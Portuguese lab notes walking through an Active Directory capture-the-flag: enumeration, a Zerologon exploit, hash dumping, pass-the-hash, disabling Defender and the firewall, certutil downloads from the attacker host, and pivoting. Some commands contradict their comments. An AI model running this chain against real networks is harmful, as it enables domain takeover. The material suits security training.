OBJETIVO É PEGAR A FLAG NA MÁQUINA 192.168.200.252 NO ARQUIVO PROOF.TXT


USUÁRIOS E SENHAS DO LAB:

Usuário: offsec\Administrator (Domain Admin)
Senha: #Admin@1102

Usuário: offsec\martin (Domain Account)
Senha: M@rt1n22

Usuário: offsec\julia (Domain Account)
Senha: P@ssw0rd

Usuário: offsec\kevin (Domain Account)
Senha: Student@123

Usuário: .\student (Local Account)
Senha: $masterPass!

ip a (O IP é 192.168.200.133)

arp-scan -local

nmap -sn 192.168.200.0/24 --exclude 192.168.200.1,192.168.200.133

ping 192.168.200.252

ping 192.168.200.253

nmap -Pn -sC -sV -v -n --open 192.168.200.252-253

crackmapexec smb 192.168.200.253

#Host 192.168.200.253 tem o LDAP rodando, sinal de que é um AD, mostra 

ENUMERAÇÃO LDAP
nmap -Pn -v -n -p 389 192.168.200.253 --script ldap-rootdse # obter informação sobre esquema do AD
nmap -Pn -v -n -p 389 192.168.200.253 --script "ldap* and not brute"


ENUMERAÇÃO DNS
dig a offsec.corp @192.168.200.253
dig ns offsec.corp @192.168.200.253
dig ptr offsec.corp @192.168.200.253
dig any offsec.corp @192.168.200.253
dig axfr offsec.corp @192.168.200.253
dnsrecon -r 192.168.200.0/24 -n 192.168.200.253 # DNS reverso para todos os IPs, -r faixa e -n o servidor DNS


ENUMERAÇÃO NETBIOS

135	TCP	MS-RPC endpoint mapper
137	UDP	NetBIOS Name Service
138	UDP	NetBIOS Datagram Service
139	TCP	NetBIOS Session ServiceW
445	TCP	SMB Protocol

nmblookup -A 192.168.200.253
nbtscan 192.168.200.253
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 192.168.200.253

<1C> DC
<00> Estação

ENUMERAÇÃO SMB
smbmap -H 192.168.200.253 # Enumera compartilhamentos


rpcclient -U "" -N 192.168.200.253
netshareenum
netshareenumall

enum4linux 192.168.200.253

nmap -Pn -v -n -p 445 192.168.200.253 --script smb-vuln*
nmap -Pn -v -n -p 445 192.168.200.253 --script smb-vuln* -d

crackmapexec smb 192.168.200.253 --shares
crackmapexec smb 192.168.200.253 --users
crackmapexec smb 192.168.200.253 --pass-pol

PROCURAR POR VULNERABILIDADES
crackmapexec smb 192.168.200.253 -L
crackmapexec smb 192.168.200.253 -M spooler
crackmapexec smb 192.168.200.253 -M ms17-010
crackmapexec smb 192.168.200.253 -M zerologon


impacket-psexec # Faz upload de um binário no alvo e se o alvo estiver com proteção será alertado e bloqueado

ZERO LOGON SCRIPTS (https://github.com/dirkjanm/CVE-2020-1472.git)
git clone https://github.com/dirkjanm/CVE-2020-1472.git
cd CVE-2020-1472
python3 cve-2020-1472-exploit.py offsec-ad 192.168.200.253

EXTRAIR HASHES
impacket-secretsdump -just-dc OFFSEC/OFFSEC-AD\$@192.168.200.253 # $ pq é sem senha

crackmapexec smb 192.168.200.253 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2' --shares
crackmapexec smb 192.168.200.253 -u administrator -H 'f2535a22448907ddffad7bddef5c53e2' --users
crackmapexec smb 192.168.200.253  -u administrator -H 'f2535a22448907ddffad7bddef5c53e2' --pass-pol

crackmapexec smb 192.168.200.253  -u administrator -H 'f2535a22448907ddffad7bddef5c53e2' -x whoami

Pode fazer a pratica com psexec, mas nesse momento sem desabilitar a proteção vai ser detectado pelo defender
impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253

EXECUTAR COMANDOS NO SERVIDOR AD UTILIZANDO WMI PARA O WINDOWS DEFENDER NÃO PEGAR 
impacket-wmiexec -hashes "hash_administrator" "dominio/usuario"@ip comando
impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253 hostname
impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253 "sc query WinDefend" # Identificar se o Defender está habilitado

evil-winrm -H 'f2535a22448907ddffad7bddef5c53e2' -u administrator -i 192.168.200.253 # COM ASPAS SIMPLES DEMORA MAIS
evil-winrm -H "f2535a22448907ddffad7bddef5c53e2" -u administrator -i 192.168.200.253 # COM ASPAS DUPLAS EU PERCEBO QUE É MAIS RÁPIDO

# DESABILITA O MONITORAMENTO
get-mppreference | findstr Monitoring
set-mppreference -disablerealtimemonitoring $false

# AGORA O PSEXEC VAI FUNCIONA
impacket-psexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.253

ping 192.168.200.252

DESABILITAR O FIREWALL DO WINDOWS PARA FACILITAR MAIS A VIDA OU ABRE UMA PORTA 
netsh advfirewall set allprofiles state off


Utilizar o script powershell para fazer portscanner diretamente do windows AD 
wget https://raw.githubusercontent.com/BornToBeRoot/PowerShell_IPv4PortScanner/main/Scripts/IPv4PortScan.ps1

Abre a porta no kali para transferir o arquivo
python3 -m http.server 80

# MOSTRAR O PROJETO https://lolbas-project.github.io/

Na máquina do atacante utiliz script powershell para fazer o download - OLHAR O SITE LOLBAS
certutil.exe -urlcache -split -f http://192.168.200.133/IPv4PortScan.ps1 c:\IPv4PortScan.ps1
OU
powershell -c (new-object system.net.webclient).DownloadFile("http://192.168.200.133/IPv4PortScan.ps1", "c:\IPv4PortScan.ps1")

EXECUTAR O PORTSCANNER
cd /
powershell -c '.\IPv4PortScan.ps1 -computer 192.168.200.252 -StartPort 445 -EndPort 445 '

cd /

FAZER PIVOTING COM SSF (https://securesocketfunneling.github.io/ssf/#download) baixa o binário para o windows e para linux e depois transfere par ao Windows alvo o arquivo zip



certutil.exe -urlcache -split -f http://192.168.200.133/ssf_win.zip ssf_win.zip 

EXTRAIR O ARQUIVO ZIPADO E ENTRA NA PASTA
powershell -c "Expand-Archive c:\ssf_win.zip -Destinationpath c:\ssf"
cd ssf
ssf-win-x86_64-3.0.0

NO ACTIVE DIRECTORY ABRE UMA PORTA PARA CONEXÃO, É COMO SE FOSSE UM SERVIDOR, MAS NO EVIL-WINRM NÃO EXECUTA, FAÇA O PROCESSO PELO IMPACKET-WMIEXEC
.\ssfd.exe -p 1111

NO KALI LINUX FECHA A CONEXÃO COMO CLIENT
/ssf -D 2222 -p 1111 192.168.200.253 # CONECTA NA PORTA 1111 DO SERVIDOR E ABRE A PORTA 5555 DO LADO DO KALI PARA FECHAR A CONEXÃO


EXECUTA O WMIEXEC USANDO PROXYCHAINS NO WINDOWS 10 PQ O DEFENDER ESTÁ HABILITADO E TENTA SE AS CREDENCIAIS DO ADMINISTRADOR VAI FUNCIONAR
proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.252 hostname

proxychains -q impacket-wmiexec -hashes "aad3b435b51404eeaad3b435b51404ee:f2535a22448907ddffad7bddef5c53e2" "offsec.corp/administrator"@192.168.200.252


dir
type proof.txt

where /r c: proof.txt
ou
dir /s proof.txt

type c:\proof.txt

Salva o conteúdo do proof.txt no arquivo hashdump e executa o john, a senha é qwerty
john hashdump

ENABLE RDP FROM POWERSHELL
powershell -c 'Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -name "fDenyTSConnections" -value 0'
